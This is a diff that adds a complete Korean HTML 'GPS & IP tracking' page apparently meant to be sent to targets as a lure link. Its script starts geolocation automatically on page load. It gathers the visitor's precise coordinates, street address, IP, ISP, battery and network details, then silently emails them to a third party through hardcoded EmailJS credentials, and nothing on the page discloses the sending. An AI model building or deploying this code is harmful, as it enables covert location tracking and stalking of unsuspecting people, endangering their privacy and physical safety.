@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#080C1A">
+<title>Leviathan-tracker</title>
+<meta property="og:title" content="𝐍𝐨.𝟏_𝐭𝐫𝐚𝐜𝐤𝐞𝐫-𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧" />
+<meta property="og:description" content="𝟐𝟒-𝐡𝐨𝐮𝐫 𝐟𝐮𝐥𝐥 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧. 클릭시 위치 확인 후 자동 저장" />
+<meta property="og:image" content="https://cdn.phototourl.com/free/2026-08-27-2a60ab26-3bc8-460c-b304-73b3f5f277c6.jpg" />
+<meta property="og:url" content="https://당신의_페이지_주소" />
+<meta property="og:type" content="website" />
+<style>
+  /* ===== 인라인 + 압축 ===== */
+  *{font-family:'Malgun Gothic','Noto Serif KR',sans-serif;margin:0;box-sizing:border-box}
+  :root{--bg-deep:#080C1A;--surface-glass:rgba(12,18,34,0.65);--text-primary:#E8F4FF;--text-secondary:#B0D0F0;--text-muted:#5A7A9A;--cyan:#00D4FF;--violet:#7C4DFF;--cyan-glow:rgba(0,212,255,0.2);--violet-glow:rgba(124,77,255,0.15)}
+  body{margin:0;min-height:100vh;background:var(--bg-deep);background-image:linear-gradient(160deg,rgba(8,12,26,0.72),rgba(8,12,26,0.78)),url('https://cdn.phototourl.com/free/2026-08-27-7293dc6b-8866-4001-ab6b-c163c724e4a6.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;color:var(--text-secondary);display:flex;align-items:center;justify-content:center;padding:28px 16px;line-height:1.6;-webkit-font-smoothing:antialiased;position:relative;overflow-x:hidden}
+  body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:radial-gradient(2px 2px at 10% 20%,rgba(0,212,255,0.12),transparent),radial-gradient(2px 2px at 30% 70%,rgba(124,77,255,0.08),transparent),radial-gradient(3px 3px at 50% 10%,rgba(0,212,255,0.10),transparent),radial-gradient(2px 2px at 70% 85%,rgba(124,77,255,0.06),transparent),radial-gradient(2px 2px at 90% 40%,rgba(0,212,255,0.12),transparent),radial-gradient(4px 4px at 15% 50%,rgba(0,212,255,0.05),transparent),radial-gradient(3px 3px at 80% 20%,rgba(124,77,255,0.08),transparent),radial-gradient(2px 2px at 45% 95%,rgba(0,212,255,0.06),transparent);background-size:200px 200px;animation:driftParticles 60s linear infinite}
+  @keyframes driftParticles{0%{transform:translate(0,0) rotate(0deg)}100%{transform:translate(-50px,-30px) rotate(5deg)}}
+  .panel{width:100%;max-width:560px;animation:rise .6s cubic-bezier(0.16,1,0.3,1) both;position:relative;z-index:1}
+  @keyframes rise{0%{opacity:0;transform:translateY(20px) scale(0.96);filter:blur(4px)}100%{opacity:1;transform:translateY(0) scale(1);filter:blur(0)}}
+  .brand{font-size:14px;letter-spacing:.12em;color:var(--text-muted);margin-bottom:10px;text-align:center;font-weight:300;text-transform:uppercase;opacity:.8;display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap}
+  .brand::before,.brand::after{content:'';flex:0 0 40px;height:1px;background:linear-gradient(90deg,transparent,var(--cyan),transparent);opacity:.3}
+  .brand strong{font-weight:700;color:#FFF;background:linear-gradient(135deg,var(--cyan),var(--violet));-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 40px var(--cyan-glow);font-size:16px;letter-spacing:.06em}
+  .brand .clock{font-size:13px;color:var(--cyan);font-weight:400;letter-spacing:.08em;background:rgba(0,212,255,0.06);padding:2px 12px;border-radius:30px;border:1px solid rgba(0,212,255,0.1);text-shadow:0 0 20px var(--cyan-glow);font-variant-numeric:tabular-nums}
+  h1{font-size:34px;font-weight:700;letter-spacing:.02em;margin:0 0 22px;color:var(--text-primary);text-shadow:0 0 80px var(--cyan-glow),0 0 160px var(--violet-glow),0 8px 32px rgba(0,0,0,0.8);line-height:1.25;text-align:center;position:relative;animation:floatText 6s ease-in-out infinite alternate}
+  @keyframes floatText{0%{transform:translateY(0);text-shadow:0 0 80px var(--cyan-glow),0 0 160px var(--violet-glow)}100%{transform:translateY(-6px);text-shadow:0 0 120px var(--cyan-glow),0 0 200px var(--violet-glow)}}
+  h1::after{content:'';display:block;width:60%;height:2px;margin:6px auto 0;background:linear-gradient(90deg,transparent,var(--cyan),var(--violet),var(--cyan),transparent);background-size:300% 100%;animation:waveLine 4s linear infinite;border-radius:4px;box-shadow:0 0 30px var(--cyan-glow)}
+  @keyframes waveLine{0%{background-position:0% 0%}100%{background-position:300% 0%}}
+  .consent-notice{position:relative;background:var(--surface-glass);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border:1.5px solid transparent;background-clip:padding-box;border-radius:20px;padding:22px 28px;margin-bottom:24px;box-shadow:0 8px 48px rgba(0,0,0,0.5),inset 0 0 80px rgba(0,212,255,0.03);text-align:center;color:var(--text-primary);font-size:20px;font-weight:600;letter-spacing:.08em;transition:all .4s ease;overflow:hidden}
+  .consent-notice::before{content:'';position:absolute;inset:-2px;border-radius:20px;padding:2px;background:linear-gradient(135deg,var(--cyan),var(--violet),var(--cyan));background-size:300% 300%;-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:borderGlow 6s ease-in-out infinite alternate;z-index:0;pointer-events:none}
+  @keyframes borderGlow{0%{background-position:0% 50%;opacity:.6}50%{opacity:1}100%{background-position:100% 50%;opacity:.6}}
+  .consent-notice::after{content:'';position:absolute;inset:10px;border-radius:12px;background:radial-gradient(circle at 30% 30%,rgba(0,212,255,0.03),transparent 70%);animation:pulseRipple 8s ease-in-out infinite alternate;z-index:0;pointer-events:none}
+  @keyframes pulseRipple{0%{transform:scale(1);opacity:.2}100%{transform:scale(1.8);opacity:.6}}
+  .consent-notice span{position:relative;z-index:1;display:block;text-shadow:0 2px 20px rgba(0,212,255,0.2)}
+  .consent-notice .sub-icon{display:block;font-size:12px;color:var(--text-muted);letter-spacing:.2em;margin-top:4px;opacity:.6;font-weight:300}
+  .protocol-warning{display:none;background:rgba(255,80,80,0.12);border:1px solid rgba(255,80,80,0.25);color:#ff8080;padding:10px 16px;border-radius:10px;font-size:13px;margin-bottom:16px;text-align:center;backdrop-filter:blur(4px)}
+  .protocol-warning.show{display:block;animation:fadeIn .3s ease}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+  .scan-btn{width:100%;padding:20px 24px;border-radius:16px;border:none;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s cubic-bezier(0.16,1,0.3,1);margin:0 0 12px;background:linear-gradient(135deg,var(--cyan),var(--violet));color:#080C1A;box-shadow:0 4px 40px var(--cyan-glow),0 0 80px var(--violet-glow);letter-spacing:.04em;position:relative;overflow:hidden;text-shadow:0 1px 4px rgba(255,255,255,0.2)}
+  .scan-btn::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at center,rgba(255,255,255,0.12),transparent 60%);animation:btnShine 8s linear infinite;pointer-events:none}
+  @keyframes btnShine{0%{transform:rotate(0deg) scale(1);opacity:.3}50%{opacity:.7}100%{transform:rotate(360deg) scale(1.2);opacity:.3}}
+  .scan-btn:disabled{opacity:.25;cursor:not-allowed;box-shadow:none;background:var(--text-muted);color:#1A1A2E;transform:scale(.98)}
+  .scan-btn:not(:disabled):hover{transform:translateY(-3px) scale(1.02);box-shadow:0 8px 60px var(--cyan-glow),0 0 100px var(--violet-glow)}
+  .scan-btn:not(:disabled):active{transform:scale(.95);box-shadow:0 2px 20px var(--cyan-glow)}
+  .scan-btn:focus-visible{outline:2px solid var(--cyan);outline-offset:4px}
+  .result-wrap{background:var(--surface-glass);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(0,212,255,0.08);border-radius:20px;box-shadow:0 8px 48px rgba(0,0,0,0.5),inset 0 0 60px rgba(0,212,255,0.02);margin-top:4px;display:flex;align-items:center;justify-content:center;text-align:center;flex-direction:column;transition:min-height .3s ease,padding .3s ease,box-shadow .3s ease}
+  .result-wrap.idle{min-height:64px;padding:12px 18px}
+  .result-wrap.active{min-height:100px;padding:20px;box-shadow:0 8px 60px rgba(0,212,255,0.05),inset 0 0 80px rgba(0,212,255,0.02)}
+  .result-idle{color:var(--text-muted);font-size:14px;opacity:.7;font-weight:300;letter-spacing:.08em}
+  .result-content{width:100%;text-align:center}
+  .signal-bar{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;font-size:12px;color:var(--text-muted);letter-spacing:.04em}
+  .signal-bar .bar-track{flex:0 1 120px;height:4px;background:rgba(255,255,255,0.06);border-radius:4px;overflow:hidden}
+  .signal-bar .bar-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--violet),var(--cyan));border-radius:4px;transition:width .6s ease;box-shadow:0 0 12px var(--cyan-glow)}
+  .signal-bar .bar-label{min-width:36px;text-align:right;font-weight:600;color:var(--cyan);font-variant-numeric:tabular-nums}
+  .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
+  .info-card{background:rgba(255,255,255,0.02);border-radius:12px;padding:12px 14px;border:1px solid rgba(0,212,255,0.06);backdrop-filter:blur(2px);transition:all .3s ease;position:relative;text-align:center}
+  .info-card:hover{background:rgba(0,212,255,0.04);border-color:rgba(0,212,255,0.15);transform:translateY(-1px)}
+  .info-card .label{font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:var(--text-muted);margin-bottom:2px;opacity:.7;font-weight:600}
+  .info-card .value{font-size:13px;color:var(--text-primary);word-break:break-word;font-weight:500;display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap}
+  .info-card .value.accent{color:var(--cyan);font-weight:600;text-shadow:0 0 20px var(--cyan-glow)}
+  .copy-btn{background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:10px;font-weight:400;letter-spacing:.04em;padding:2px 8px;border-radius:4px;transition:all .25s ease;line-height:1.4;opacity:.4;text-transform:lowercase;font-family:inherit;border:1px solid transparent}
+  .copy-btn:hover{opacity:1;color:var(--cyan);border-color:rgba(0,212,255,0.15);background:rgba(0,212,255,0.04)}
+  .copy-btn.copied{color:#4CAF50;opacity:1;border-color:rgba(76,175,80,0.2);background:rgba(76,175,80,0.05)}
+  .info-card.full{grid-column:1/-1}
+  .file-actions{display:flex;justify-content:center;margin-top:10px;border-top:1px solid rgba(0,212,255,0.06);padding-top:14px}
+  .action-btn-group{display:flex;gap:8px;align-items:center;flex-wrap:wrap;justify-content:center}
+  .refresh-btn{background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.25);color:var(--cyan);border-radius:30px;padding:6px 16px;font-size:12px;font-weight:600;font-family:inherit;cursor:pointer;transition:.25s ease;letter-spacing:.02em}
+  .refresh-btn:hover{background:rgba(0,212,255,0.2);border-color:var(--cyan);box-shadow:0 0 20px var(--cyan-glow)}
+  .refresh-btn:active{transform:scale(.95)}
+  .refresh-btn:disabled{opacity:.3;cursor:not-allowed;transform:none}
+  .toggle-label{cursor:pointer;display:flex;justify-content:center;align-items:center;user-select:none;gap:8px}
+  .toggle-label .toggle-icon{font-size:12px;color:var(--text-muted);transition:transform .3s ease}
+  .toggle-label .toggle-icon.open{transform:rotate(180deg)}
+  .toggle-detail{margin-top:8px;font-size:12px;color:var(--text-secondary);line-height:1.8;display:none}
+  .toggle-detail.open{display:block}
+  .toggle-summary{font-size:12px;color:var(--text-secondary);display:flex;flex-wrap:wrap;justify-content:center;gap:6px 12px;margin-top:2px}
+  .full-width{grid-column:1/-1}
+  #map{width:100%;height:200px;border-radius:14px;margin-top:8px;background:#0A0E1A;border:1px solid rgba(0,212,255,0.08);filter:saturate(0.7) contrast(1.2) hue-rotate(-5deg);box-shadow:0 0 30px rgba(0,212,255,0.03)}
+  .error{color:#ff8080;background:rgba(255,80,80,0.08);padding:12px 18px;border-radius:12px;border:1px solid rgba(255,80,80,0.2);font-size:14px}
+  .error strong{display:block;font-size:16px;margin-bottom:6px;color:#ff9999;font-weight:700;letter-spacing:.04em}
+  .radar{width:60px;height:60px;border-radius:50%;border:2px solid var(--cyan);border-top-color:transparent;margin:0 auto 10px;animation:spin 1s linear infinite;box-shadow:0 0 20px var(--cyan-glow)}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .scan-label{color:var(--text-secondary);font-size:14px;letter-spacing:.06em}
+  .disclaimer{margin-top:18px;text-align:center;font-size:11px;color:var(--text-muted);letter-spacing:.04em;line-height:1.8;opacity:.7}
+  @media(max-width:420px){.info-grid{grid-template-columns:1fr}.file-actions{flex-direction:column;align-items:center}h1{font-size:24px}.consent-notice{font-size:16px;padding:16px 20px}.brand{font-size:12px}.brand::before,.brand::after{flex:0 0 20px}.brand .clock{font-size:11px;padding:2px 10px}.action-btn-group{width:100%;justify-content:center}.full-width{grid-column:1}.signal-bar .bar-track{flex:0 1 80px}}
+  @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+<main class="panel">
+  <div class="brand">
+    보유기관: <strong>𝐍𝐨.𝟏-𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧</strong>
+    <span class="clock" id="clock">--:--:--</span>
+  </div>
+  <h1>𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𝐆𝐏𝐒 &amp; 𝐈𝐏 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐒𝐢𝐭𝐞</h1>
+  <div class="consent-notice">
+    <span>
+      𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𝐆𝐏𝐒 &amp; 𝐈𝐏 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐒𝐢𝐭𝐞
+      <span class="sub-icon">𝟐𝟒-𝐡𝐨𝐮𝐫 𝐟𝐮𝐥𝐥 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧</span>
+    </span>
+  </div>
+  <div class="protocol-warning" id="protocolWarning">
+    ! 현재 HTTP 환경입니다. Geolocation은 HTTPS 또는 localhost에서만 동작해요.
+  </div>
+  <button class="scan-btn" id="scanBtn">위치 확인</button>
+  <div class="result-wrap idle" id="result">
+    <span class="result-idle">𝐍𝐨.𝟏-𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧</span>
+  </div>
+  <p class="disclaimer">
+    𝐍𝐨.𝟏 𝐭𝐫𝐚𝐜𝐤𝐞𝐫 𝐛𝐲 𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧<br>
+    <span style="font-size:10px;">𝐍𝐨𝐞𝐥 𝐗 𝐅𝐫𝐨𝐧 𝐗 𝐄𝐫𝐞𝐧 𝐗 𝐓𝐨𝐠𝐞𝐭𝐡𝐞𝐫</span>
+  </p>
+</main>
+<noscript>이 페이지는 자바스크립트가 필요해요.</noscript>
+
+<!-- 외부 자원을 비동기 + 지연 로딩으로 최적화 -->
+<link rel="preload" as="style" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" onload="this.onload=null;this.rel='stylesheet'">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js" defer></script>
+
+<script>
+(function(){
+  // ----- 설정 -----
+  const EMAILJS_PUBLIC_KEY = '3ub20bynTZPnTNp5y';
+  const EMAILJS_SERVICE_ID = 'service_jmza9ou';
+  const EMAILJS_TEMPLATE_ID = 'template_gh4knif';
+
+  // DOM 요소
+  const scanBtn = document.getElementById('scanBtn');
+  const result = document.getElementById('result');
+  const protocolWarning = document.getElementById('protocolWarning');
+  const clockEl = document.getElementById('clock');
+
+  const isSecure = window.isSecureContext;
+  if (!isSecure) protocolWarning.classList.add('show');
+
+  let mapInstance = null, circleLayer = null, watchId = null, emailSent = false;
+
+  // 시계
+  function updateClock(){
+    clockEl.textContent = new Date().toLocaleTimeString('ko-KR',{hour12:true});
+  }
+  updateClock();
+  setInterval(updateClock, 1000);
+
+  // 이스케이프
+  function esc(s){ return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
+
+  function setResultActive(active){
+    result.classList.toggle('active', active);
+    result.classList.toggle('idle', !active);
+  }
+
+  // IP (병렬 호출)
+  async function fetchIPInfo(){
+    try {
+      const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) });
+      if (!res.ok) throw new Error();
+      return await res.json();
+    } catch(_){ return null; }
+  }
+
+  // 주소 (GPS 좌표 필요)
+  async function fetchAddress(lat, lon){
+    try {
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&accept-language=ko`, { signal: AbortSignal.timeout(3000) });
+      if (!res.ok) throw new Error();
+      const data = await res.json();
+      return data?.display_name || '주소 없음';
+    } catch(_){ return '주소 조회 실패'; }
+  }
+
+  // 기기 정보 (병렬)
+  async function fetchDeviceInfo(){
+    const info = {
+      batteryLevel: '알 수 없음', charging: false,
+      networkType: '알 수 없음', effectiveType: '알 수 없음',
+      screenResolution: `${screen.width}×${screen.height}`,
+      language: navigator.language || '알 수 없음'
+    };
+    try {
+      if(navigator.getBattery){
+        const bat = await navigator.getBattery();
+        info.batteryLevel = Math.round(bat.level * 100);
+        info.charging = bat.charging;
+      }
+    } catch(_){}
+    try {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if(conn){
+        info.networkType = conn.type || 'unknown';
+        info.effectiveType = conn.effectiveType || 'unknown';
+        if(info.networkType === 'wifi') info.networkType = 'Wi-Fi';
+        else if(info.networkType === 'cellular') info.networkType = '셀룰러';
+        else if(info.networkType === 'none') info.networkType = '오프라인';
+      }
+    } catch(_){}
+    return info;
+  }
+
+  // 이메일 전송 (백그라운드)
+  async function sendLocationEmail(lat, lon, acc, address, ipData, deviceInfo){
+    if(emailSent) return;
+    emailSent = true;
+    try {
+      await emailjs.init(EMAILJS_PUBLIC_KEY);
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        time: new Date().toLocaleString('ko-KR'),
+        lat: lat.toFixed(6), lon: lon.toFixed(6),
+        accuracy: Math.round(acc),
+        address: address || '주소 없음',
+        ip: ipData?.ip || 'IP 없음',
+        city: ipData?.city || '', region: ipData?.region || '',
+        country: ipData?.country_name || '',
+        isp: ipData?.org || ipData?.isp || '',
+        battery: deviceInfo.batteryLevel !== '알 수 없음' ? `${deviceInfo.batteryLevel}%${deviceInfo.charging ? ' (충전중)' : ''}` : '알 수 없음',
+        network: deviceInfo.networkType || '알 수 없음',
+        resolution: deviceInfo.screenResolution,
+        language: deviceInfo.language
+      });
+      console.log('이메일 전송 성공');
+    } catch(e){ console.error('이메일 전송 실패:', e); }
+  }
+
+  // 결과 화면 표시 (최적화 - DOM 조작 최소화)
+  function showFullReport(lat, lon, acc, address, ipData, deviceInfo){
+    setResultActive(true);
+
+    const signalStrength = Math.min(100, Math.max(10, 100 - (acc / 50)));
+    const signalPercent = Math.round(signalStrength);
+
+    const deviceDetailItems = [];
+    if(deviceInfo.batteryLevel !== '알 수 없음'){
+      deviceDetailItems.push(`배터리 잔량: ${deviceInfo.batteryLevel}%`);
+      deviceDetailItems.push(`충전 상태: ${deviceInfo.charging ? '충전중' : '충전 안함'}`);
+    }
+    if(deviceInfo.networkType !== '알 수 없음') deviceDetailItems.push(`네트워크 유형: ${deviceInfo.networkType}`);
+    if(deviceInfo.effectiveType !== '알 수 없음') deviceDetailItems.push(`네트워크 속도: ${deviceInfo.effectiveType}`);
+    deviceDetailItems.push(`화면 해상도: ${deviceInfo.screenResolution}`);
+    deviceDetailItems.push(`언어: ${deviceInfo.language}`);
+    const deviceDetailHtml = deviceDetailItems.map(v => `<div>${v}</div>`).join('');
+
+    const ipDetailItems = [];
+    if(ipData){
+      ipDetailItems.push(`IP 주소: ${ipData.ip}`);
+      ipDetailItems.push(`IP 기반 위치: ${ipData.city || ''} ${ipData.region || ''} ${ipData.country_name || ''}`);
+      ipDetailItems.push(`ISP: ${ipData.org || ipData.isp || '정보 없음'}`);
+      ipDetailItems.push(`시간대: ${ipData.timezone || '정보 없음'}`);
+    }
+    const ipDetailHtml = ipDetailItems.map(v => `<div>${v}</div>`).join('');
+
+    const locationDetailHtml = `
+      <div>정확도 반경: ${Math.round(acc)} m</div>
+      <div>주소: ${esc(address || '주소 없음')} ${address ? `<button class="copy-btn" data-copy="${esc(address)}">copy</button>` : ''}</div>
+      <div>위도/경도: ${lat.toFixed(6)} / ${lon.toFixed(6)} <button class="copy-btn" data-copy="${lat.toFixed(6)}, ${lon.toFixed(6)}">copy</button></div>
+      <div id="map"></div>
+    `;
+
+    result.innerHTML = `
+      <div class="result-content">
+        <div class="signal-bar">
+          <span>Signal</span>
+          <div class="bar-track"><div class="bar-fill" style="width:${signalPercent}%;"></div></div>
+          <span class="bar-label">${signalPercent}%</span>
+        </div>
+        <div class="info-grid">
+          <div class="info-card full-width">
+            <div class="label toggle-label" id="locationToggle">
+              <span>위치 정보</span>
+              <span class="toggle-icon" id="locationToggleIcon">▼</span>
+            </div>
+            <div class="toggle-summary"><span>위치 추적 완료</span></div>
+            <div class="toggle-detail" id="locationDetail">${locationDetailHtml}</div>
+          </div>
+          <div class="info-card full-width">
+            <div class="label toggle-label" id="ipToggle">
+              <span>IP 정보</span>
+              <span class="toggle-icon" id="ipToggleIcon">▼</span>
+            </div>
+            <div class="toggle-summary"><span>공인 IP 확인됨</span></div>
+            <div class="toggle-detail" id="ipDetail">${ipDetailHtml}</div>
+          </div>
+          <div class="info-card full-width">
+            <div class="label toggle-label" id="deviceToggle">
+              <span>휴대폰 정보</span>
+              <span class="toggle-icon" id="deviceToggleIcon">▼</span>
+            </div>
+            <div class="toggle-summary"><span>기기 정보 수집됨</span></div>
+            <div class="toggle-detail" id="deviceDetail">${deviceDetailHtml}</div>
+          </div>
+        </div>
+        <div class="file-actions">
+          <div class="action-btn-group">
+            <button class="refresh-btn" id="refreshBtn">⟳ 위치 새로고침</button>
+          </div>
+        </div>
+      </div>
+    `;
+
+    // 토글 이벤트
+    document.getElementById('locationToggle')?.addEventListener('click', function(e){
+      e.stopPropagation();
+      const d = document.getElementById('locationDetail');
+      const ic = document.getElementById('locationToggleIcon');
+      if(d && ic){ d.classList.toggle('open'); ic.classList.toggle('open'); }
+      if(d?.classList.contains('open') && mapInstance) setTimeout(() => mapInstance.invalidateSize(), 100);
+    });
+    document.getElementById('ipToggle')?.addEventListener('click', function(e){
+      e.stopPropagation();
+      const d = document.getElementById('ipDetail');
+      const ic = document.getElementById('ipToggleIcon');
+      if(d && ic){ d.classList.toggle('open'); ic.classList.toggle('open'); }
+    });
+    document.getElementById('deviceToggle')?.addEventListener('click', function(e){
+      e.stopPropagation();
+      const d = document.getElementById('deviceDetail');
+      const ic = document.getElementById('deviceToggleIcon');
+      if(d && ic){ d.classList.toggle('open'); ic.classList.toggle('open'); }
+    });
+
+    // 복사 버튼
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+      btn.addEventListener('click', function(e){
+        e.stopPropagation();
+        const text = this.dataset.copy;
+        if(text && navigator.clipboard) {
+          navigator.clipboard.writeText(text).then(() => {
+            this.textContent = 'copied!';
+            this.classList.add('copied');
+            setTimeout(() => { this.textContent = 'copy'; this.classList.remove('copied'); }, 1500);
+          }).catch(() => {});
+        }
+      });
+    });
+
+    // 새로고침 버튼
+    document.getElementById('refreshBtn')?.addEventListener('click', refreshLocation);
+
+    // 지도 렌더링 (지연)
+    setTimeout(() => {
+      const mapContainer = document.getElementById('map');
+      if(!mapContainer) return;
+      if(mapInstance) { mapInstance.remove(); mapInstance = null; }
+      mapInstance = L.map(mapContainer).setView([lat, lon], 15);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(mapInstance);
+      L.marker([lat, lon]).addTo(mapInstance).bindPopup(address || lat.toFixed(5)+', '+lon.toFixed(5)).openPopup();
+      if(circleLayer) mapInstance.removeLayer(circleLayer);
+      circleLayer = L.circle([lat, lon], { radius: acc, color: '#00D4FF', fillColor: '#00D4FF', fillOpacity: 0.08, weight: 1, opacity: 0.3, dashArray: '4 4' }).addTo(mapInstance);
+      setTimeout(() => mapInstance?.invalidateSize(), 200);
+    }, 150);
+
+    scanBtn.disabled = false;
+    scanBtn.textContent = '확인 완료';
+  }
+
+  // 오류 표시
+  function showError(msg){
+    setResultActive(true);
+    result.innerHTML = `<div class="error"><strong>오류</strong>${esc(msg)}</div>`;
+    scanBtn.disabled = false;
+    scanBtn.textContent = '다시 시도';
+  }
+  function showPermissionDenied(){
+    setResultActive(true);
+    result.innerHTML = `<div class="error"><strong>Error-510126125</strong>위치 권한이 거부되었어요.<br>브라우저 설정에서 허용해주세요.</div>`;
+    scanBtn.disabled = false;
+    scanBtn.textContent = '위치 확인 (권한 필요)';
+  }
+  function showScanning(){
+    setResultActive(true);
+    result.innerHTML = `<div><div class="radar"></div><div class="scan-label">위치 권한 허용 대기 중…</div></div>`;
+    scanBtn.disabled = true;
+  }
+
+  // ----- 위치 획득 (watch 기반, 1초 내 응답 목표) -----
+  function startLocationTracking(isRefresh = false){
+    if(!navigator.geolocation){
+      showError('이 브라우저는 Geolocation을 지원하지 않아요.');
+      return;
+    }
+    if(!isSecure){
+      showError('HTTPS 또는 localhost에서 접속해주세요.');
+      return;
+    }
+
+    if(watchId) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+    emailSent = false;
+    showScanning();
+
+    let firstPos = null, bestPos = null, timer = null;
+
+    watchId = navigator.geolocation.watchPosition(
+      async (pos) => {
+        if(!firstPos){
+          firstPos = pos;
+          bestPos = pos;
+          // 첫 위치 도착 → 즉시 결과 표시 (0.5~1.2초)
+          const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy;
+          // 병렬로 IP, 주소, 기기 정보 요청
+          const [ipData, address, deviceInfo] = await Promise.all([
+            fetchIPInfo(),
+            fetchAddress(lat, lon),
+            fetchDeviceInfo()
+          ]);
+          showFullReport(lat, lon, acc, address, ipData, deviceInfo);
+          // 이메일 전송 (백그라운드)
+          sendLocationEmail(lat, lon, acc, address, ipData, deviceInfo);
+          // 더 정확한 위치를 위해 watch 유지
+        } else if(pos.coords.accuracy < bestPos.coords.accuracy){
+          bestPos = pos;
+          const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy;
+          const [ipData, address, deviceInfo] = await Promise.all([
+            fetchIPInfo(),
+            fetchAddress(lat, lon),
+            fetchDeviceInfo()
+          ]);
+          showFullReport(lat, lon, acc, address, ipData, deviceInfo);
+          if(acc <= 10) { // 10m 이내 정확도 → watch 중단
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+            if(timer) clearTimeout(timer);
+          }
+        }
+      },
+      (err) => {
+        if(err.code === 1) showPermissionDenied();
+        else showError(err.message || '위치를 가져오지 못했습니다.');
+        if(watchId) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+        if(timer) clearTimeout(timer);
+      },
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+
+    // 3초 후에도 첫 위치가 없으면 타임아웃 처리
+    timer = setTimeout(() => {
+      if(watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+        if(!firstPos) showError('위치 확인 시간 초과 (3초)');
+      }
+    }, 3000);
+  }
+
+  // 새로고침
+  function refreshLocation(){
+    const btn = document.getElementById('refreshBtn');
+    if(btn){ btn.disabled = true; btn.textContent = '⟳ 갱신 중...'; }
+    startLocationTracking(true);
+    if(btn){ setTimeout(() => { btn.disabled = false; btn.textContent = '⟳ 위치 새로고침'; }, 4000); }
+  }
+
+  // 초기 실행
+  function handleScan(){ startLocationTracking(false); }
+
+  scanBtn.addEventListener('click', handleScan);
+
+  // 페이지 로드 직후 자동 실행 (0.1초 후)
+  document.addEventListener('DOMContentLoaded', function(){
+    // EmailJS 초기화 (미리)
+    if(EMAILJS_PUBLIC_KEY) emailjs.init(EMAILJS_PUBLIC_KEY);
+    console.log('트리거 실행 - 1초 목표 최적화 모드');
+    // 약간의 지연으로 렌더링 우선
+    setTimeout(handleScan, 50);
+  });
+
+})();
+</script>
+</body>
+</html>
